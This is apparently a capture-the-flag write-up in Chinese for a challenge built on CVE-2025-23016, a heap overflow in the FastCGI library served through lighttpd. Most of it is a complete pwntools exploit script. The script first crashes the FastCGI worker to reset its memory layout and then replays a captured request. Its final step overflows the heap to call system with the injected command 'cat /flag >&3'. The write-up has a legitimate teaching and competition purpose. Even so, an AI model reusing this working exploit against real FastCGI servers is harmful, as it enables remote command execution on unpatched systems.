# D^3CGI

基于 FastCGI 一个简单的 1day: [CVE-2025-23016](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-23016)

Patch: [b0eabcaf4d4f371514891a52115c746815c2ff15](https://github.com/FastCGI-Archives/fcgi2/commit/b0eabcaf4d4f371514891a52115c746815c2ff15)

Blog: [cve-2025-23016-exploiter-la-bibliotheque-fastcgi](https://www.synacktiv.com/publications/cve-2025-23016-exploiter-la-bibliotheque-fastcgi.html)

堆风水过程与漏洞成因分析这里不再赘述，请参考上述 Blog 链接👆

很多选手认为遇到了远程和本地Docker环境有区别的问题，其实并没有。这是设计时考虑在内的需要解决的exploit鲁棒性问题。存在两种情况可能导致本地work的exploit在远程无法work：

1. 远程环境受到其它连接的扰动，内存布局发生了变化；
2. 使用cURL等工具对远程和本地请求时一些请求头例如 Host 长度具有差异；

为了解决这些问题，可以使用如下方式改进 PoC：

1. 通过发送造成缓冲区溢出的请求，使得 lighttpd 预先启动的 fastcgi 进程崩溃重启，重置内存布局；

2. 不直接使用 cURL，而是抓取其请求被转换成 FastCGI 格式后的报文进行重放。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.log_level = "debug"
context.arch = "i386"

def start(argv=[], *a, **kw):
    return remote("127.0.0.1", 9999)
    #return remote("35.220.136.70", 30777)

"""
typedef struct {
    unsigned char version;
    unsigned char type;
    unsigned char requestIdB1;
    unsigned char requestIdB0;
    unsigned char contentLengthB1;
    unsigned char contentLengthB0;
    unsigned char paddingLength;
    unsigned char reserved;
} FCGI_Header;
"""
def makeHeader(type, requestId, contentLength, paddingLength):
    header = p8(1) + p8(type) + p16(requestId) + p16(contentLength)[::-1] + p8(paddingLength) + p8(0)
    return header

"""
typedef struct {
    unsigned char roleB1;
    unsigned char roleB0;
    unsigned char flags;
    unsigned char reserved[5];
} FCGI_BeginRequestBody;
"""
def makeBeginReqBody(role, flags):
    return p16(role)[::-1] + p8(flags) + b"\x00" * 5
    
# crash and restart daemon
io = start()
io.send(makeHeader(1, 1, 8, 0) + makeBeginReqBody(1, 0) + makeHeader(9, 0, 900, 0) + (p8(0x13) + p8(0x13) + b"b" * 0x26)*1 + p32(0xffffffff) + p32(0xffffffff) + p32(0xdeadbeef)*0x30)
io.close()
pause(3) # restarting...
# curl http://127.0.0.1:9999/ => FastCGI Format
io = start()
io.send(b'\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x04\x00\x01\x01\x9b\x00\x00\x0e\x01CONTENT_LENGTH0\x0c\x00QUERY_STRING\x0b\x01REQUEST_URI/\x0f\x03REDIRECT_STATUS200\x0b\x01SCRIPT_NAME/\x0f\x05SCRIPT_FILENAME/www/\r\x04DOCUMENT_ROOT/www\x0e\x03REQUEST_METHODGET\x0f\x08SERVER_PROTOCOLHTTP/1.1\x0f\x0fSERVER_SOFTWARElighttpd/1.4.79\x11\x07GATEWAY_INTERFACECGI/1.1\x0e\x04REQUEST_SCHEMEhttp\x0b\x04SERVER_PORT8888\x0b\tSERVER_ADDR127.0.0.1\x0b\tSERVER_NAME127.0.0.1\x0b\tREMOTE_ADDR127.0.0.1\x0b\x05REMOTE_PORT36190\t\x0eHTTP_HOST127.0.0.1:8888\x0f\nHTTP_USER_AGENTcurl/8.5.0\x0b\x03HTTP_ACCEPT*/*\x01\x04\x00\x01\x00\x00\x00\x00\x01\x05\x00\x01\x00\x00\x00\x00')
io.close()
# exploit and read '/flag'
io = start()
system_plt = 0x80490c0
io.send(makeHeader(1, 1, 8, 0) + makeBeginReqBody(1, 0) + makeHeader(9, 0, 900, 0) + (p8(0x13) + p8(0x13) + b"b" * 0x26)*1 + ((p8(0) * 2) * 1) + p32(0xffffffff) + p32(0xffffffff) + p32(0xdeadbeef)*12  + b"aaa; cat /flag >&3".ljust(4*5, b"\x00") +p32(0) * 3 + p32(system_plt) + p32(0xdeadbeef) )
io.interactive()
```
